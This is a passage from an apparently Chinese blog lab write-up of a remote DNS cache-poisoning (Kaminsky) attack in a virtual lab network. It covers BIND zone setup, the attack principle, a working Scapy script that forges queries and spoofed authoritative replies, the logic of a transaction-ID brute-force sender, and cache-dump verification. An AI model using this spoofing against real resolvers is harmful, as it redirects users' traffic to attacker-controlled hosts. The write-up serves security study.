        <span class="token builtin class-name">type</span> master<span class="token punctuation">;</span>
        <span class="token function">file</span> <span class="token string">"/etc/bind/example.com.zone"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
      <p>
       然后创建文件
       <code>
        /etc/bind/example.com.zone
       </code>
       ，添加以下内容：
      </p>
      <pre><code class="prism language-bash"><span class="token variable">$TTL</span> 3D
@ IN SOA ns.example.com. admin.example.com <span class="token punctuation">(</span>
	<span class="token number">2008111001</span>
	8H
	2H
	4W
	1D <span class="token punctuation">)</span>
@ IN NS ns.ssd.net.
@ IN A <span class="token number">1.1</span>.1.1
www IN A <span class="token number">1.1</span>.1.2
ns IN A <span class="token number">10.10</span>.10.168
* IN A <span class="token number">10.10</span>.10.17
</code></pre>
      <p>
       注意：在配置完攻击机和服务机之后，可以运行
       <code>
        sudo rndc flush
       </code>
       测试一下。当遇到
       <code>
        rndc: connect failed: 127.0.0.1#953: connection refused
       </code>
       报错时，说明bind9的配置项出错，此时可以找找改了哪里，把错误纠正。
      </p>
      <p>
       等到攻击成功后，www.example.com对应的是
       <code>
        1.1.1.2
       </code>
       。
      </p>
     </li>
     <li>
      <p>
       将之前实验添加的网络时延规则删除：
      </p>
      <pre><code class="prism language-bash"><span class="token function">sudo</span> tc qdisc del dev br-29c63b220f5a root 
</code></pre>
     </li>
     <li>
      <p>
       其他配置不变。刷新缓存，重启dns和攻击机上的DNS服务器：
      </p>
      <pre><code class="prism language-bash"><span class="token function">sudo</span> rndc flush
<span class="token function">sudo</span> <span class="token function">service</span> bind9 restart
</code></pre>
      <p>
       在user上多次运行
       <code>
        dig www.example.com
       </code>
       ，直到得到结果：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/61b46ee316f080b9a529cc0582a5d3db.png"/>
      </p>
      <p>
       如果能得到结果，说明环境配置成功。
      </p>
      <p>
       观察返回的信息，可以知道www.example.com的远程请求过程：①user向dns发起询问，DNS服务器依次查询；②先查到根域名服务器的地址；③再通过根域名服务器得到.com顶级域名服务器的地址；④再通过.com顶级域名服务器查询得到example.com权威域名服务器的地址；⑤通过询问example.com权威域名服务器，得到www.example.com的IP地址为93.184.216.34。
      </p>
     </li>
    </ol>
    <h5>
     <a id="_490">
     </a>
     攻击原理
    </h5>
    <p>
     当dns中已经有example.com的缓存信息时，它不再从根域名服务器查起，而是直接询问example.com。攻击机可以想Apollo发送伪造的响应，比真正的example.com先一步到达dns即可。
    </p>
    <p>
     但是由于dns缓存有较长时间，攻击机想要等待服务器主动发起对指定域名的DNS请求需要时间。Dan Kaminsky提出了一种攻击方法去避免这个问题，该方法的步骤是：
    </p>
    <p>
     ①攻击者查询example.com随机的不存在的名称；
     <br/>
     ②dns服务器缓存中没有这一域名，因此向example.com发起请求；
     <br/>
     ③攻击机针对请求发送DNS欺骗流，不仅为该域名提供Answer，还将ns.姓名.net作为example.com域的权威域名服务器，从而破坏缓存。
    </p>
    <h5>
     <a id="_500">
     </a>
     攻击过程
    </h5>
    <p>
     为了提高攻击成功率，再次添加时延（建议少加点）：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> tc qdisc <span class="token function">add</span> dev br-29c63b220f5a root netem delay 100ms
</code></pre>
    <blockquote>
     <p>
      注：如果wireshark看到dns服务响应很慢，别加了。如果外网响应太快死活攻击不成功，多加点。
     </p>
    </blockquote>
    <p>
     两个攻击脚本：
    </p>
    <p>
     伪造请求包和响应包的python程序general_dns.py：
    </p>
    <pre><code class="prism language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> string
<span class="token keyword">import</span> random

<span class="token comment"># random name</span>
name <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.example.com'</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
Qdsec <span class="token operator">=</span> DNSQR<span class="token punctuation">(</span>qname<span class="token operator">=</span>name<span class="token punctuation">)</span>

<span class="token comment"># query</span>
ip_q  <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">'10.10.10.2'</span><span class="token punctuation">,</span>src<span class="token operator">=</span><span class="token string">'10.10.10.1'</span><span class="token punctuation">)</span> <span class="token comment"># dst: dns; src:attacker</span>
udp_q <span class="token operator">=</span> UDP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">53</span><span class="token punctuation">,</span>sport<span class="token operator">=</span><span class="token number">33333</span><span class="token punctuation">,</span>chksum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
dns_q <span class="token operator">=</span> DNS<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0xaaaa</span><span class="token punctuation">,</span>qr<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>qdcount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>ancount<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>nscount<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>arcount<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>qd<span class="token operator">=</span>Qdsec<span class="token punctuation">)</span>
pkt_q<span class="token operator">=</span> ip_q<span class="token operator">/</span>udp_q<span class="token operator">/</span>dns_q

<span class="token comment"># reply</span>
ip_r <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">'10.10.10.2'</span><span class="token punctuation">,</span> src<span class="token operator">=</span><span class="token string">'199.43.135.53'</span><span class="token punctuation">,</span> chksum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
udp_r <span class="token operator">=</span> UDP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">33333</span><span class="token punctuation">,</span> sport<span class="token operator">=</span><span class="token number">53</span><span class="token punctuation">,</span> chksum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
Anssec <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span>name<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'1.2.3.4'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">)</span>
 <span class="token comment"># The Authority Section</span>
NSsec <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'example.com'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'NS'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'ns.ssd.net'</span><span class="token punctuation">)</span>
Addsec <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'ns.ssd.net'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'10.10.10.1'</span><span class="token punctuation">)</span>
dns_r <span class="token operator">=</span> DNS<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0xAAAA</span><span class="token punctuation">,</span> aa<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> rd<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> qr<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> qdcount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ancount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> nscount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> arcount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> qd<span class="token operator">=</span>Qdsec<span class="token punctuation">,</span> an<span class="token operator">=</span>Anssec<span class="token punctuation">,</span> ns<span class="token operator">=</span>NSsec<span class="token punctuation">,</span> ar<span class="token operator">=</span>Addsec<span class="token punctuation">)</span>
pkt_r <span class="token operator">=</span> ip_r<span class="token operator">/</span>udp_r<span class="token operator">/</span>dns_r

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'query.bin'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>
  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>pkt_q<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'reply.bin'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>pkt_r<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     其中响应包的id要随机生成，发送从0~ffff号的所有报文来进行DNS欺骗。
    </p>
    <p>
     用bless查看构造的reply.bin的二进制，找到id的偏移地址：
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/9cdfa2939d7c3f8033520c8ce08f2592.png"/>
    </p>
    <p>
     偏移量为0x1c，十进制为28。
    </p>
    <p>
     攻击程序dns_attack.c的编写逻辑：
    </p>
    <ol>
     <li>
      每轮循环开始，先运行一次伪造请求包和响应包的python程序；
     </li>
     <li>
      打开
      <code>
       query.bin
      </code>
      和
      <code>
       reply.bin
      </code>
      ，写入缓存区。
     </li>
     <li>
      发送DNS请求包；
     </li>
     <li>
      修改
      <code>
       reply.bin
      </code>
      的dns序列号，从1000~65535(观察了一下，发包速度相当快，可以支持多发一些包)，转换成大端字节序再写入(也可以不转)。并重新计算dns的chksum。
     </li>
     <li>
      依次发送这些DNS响应包。再回到1重新循环。
     </li>
    </ol>
    <p>
     发包的C程序dns_attack.c：
    </p>
    <pre><code class="prism language-c">程序在Gitee里，放这里显示会出错。
</code></pre>
    <p>
     编译程序的方式：
    </p>
    <pre><code class="prism language-bash">gcc -lpcap dns_attack.c -o dns_attack
</code></pre>
    <ol>
     <li>
      <p>
       编译并运行发包攻击程序，过一会儿在dns上转储cache，运行：
      </p>
      <pre><code class="prism language-bash"><span class="token function">sudo</span> rndc dumpdb -cache
<span class="token function">sudo</span> <span class="token function">cat</span> /var/cache/bind/dump.db <span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">"google|youtube|example|attack|ssd"</span>
</code></pre>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/82435dd67c8e1b08981c1ac39d26e32e.png"/>
      </p>
      <p>
       可以看到example.com现在对应的是ns.ssd.net，其他的被注释掉了，IP也解析成攻击目标了，相当成功。
      </p>
      <p>
       再观察一下Wireshark的报文：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/2efbd8f91eae76c9fe36492acdb35df2.png"/>
      </p>
      <p>
       能看到伪造的随机请求包，也可以看到服务器收到伪造的请求包，开始主动向权威域名服务器请求，还可以看到伪造的序号顺序的响应。
      </p>
      <blockquote>
       <p>
        如果，①伪造的请求包、②服务器向权威域名服务器的请求包，以及③伪造的回应包、④真实权威域名服务器的回应包，有任一无法找到，则说明攻击结果异常，请具体情况具体分析，不要一味攻击。
        <br/>
        正常情况，在序列号从10000到65535的欺骗中，有约85%的几率一次攻击成功。
        <br/>
        最多攻击5次，即可停下。如果Ctrl+C无法中止程序，请用ps -a查看进程号，再kill 进程号，终止程序。
        <br/>
        注：在发起攻击之前，清空DNS缓存、使用用户机dig www.example.com拿到IP(使服务器中具备权威域名服务器的缓存)，将会节省DNS服务器向根域名服务器询问权威域名服务器的时间，从而减少攻击的时长。【如果不提前dig就直接攻击，攻击过程中持续看cache，刷出来example了就停下，有85%的几率可以得到一个完全没有真实权威域名服务器cache记录的结果，我愿称之为完美】
       </p>
      </blockquote>
      <p>
       只要序号符合0xe0fa，并且比真实服务器早，就可以攻击成功。
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/eb8244bf6eca42d8decdf6a5fb061a95.png"/>
      </p>
      <p>
       过滤
       <code>
        10.10.10.1
       </code>
       的报文，除了这些报文以及服务器的主动请求之外，其他的报文就是攻击机伪造的请求。可以看到攻击成功的可能性很大。
      </p>
      <blockquote>
       <p>
        注意：已经攻击完成后，
        <strong>
         一定要及时中止
         <code>
          dns_attack
         </code>
         程序
        </strong>
        。我在已经集齐所有完美的实验现象之后，忘记中止攻击程序，然后发送了过多的攻击报文，我自己的sock崩溃了。随后虚拟机内存不够，自动关机重启，还好我有快照，否则我也会崩溃了。
       </p>
      </blockquote>
     </li>
     <li>
      <p>
       此时在用户机上运行
       <code>
        dig www.example.com
       </code>
       、
       <code>
        dig abcd.example.com
       </code>
       去测试：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/c2bac7f119f8fb1079c49859901ffa0e.png"/>
      </p>
      <p>
       可以看到，域名成功地被解析成预期值
       <code>
        1.1.1.2
       </code>
       了！
      </p>
      <p>
       然后随便攻击一个example.com域的域名，也可以成功解析成预期值：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/73a9d5045cbf2e25ef2603d8ad4f7694.png"/>
      </p>
      <p>
       因此攻击成功。
      </p>
     </li>
    </ol>
    <div>
    </div>
    <p>
     不点个赞再走嘛！？
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
  <div class="blog-extension-box" id="blogExtensionBox" style="width:400px;margin:auto;margin-top:12px">
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f34363130363238352f:61727469636c652f64657461696c732f313234333334333634" class_="artid" style="display:none">
 </p>
</div>


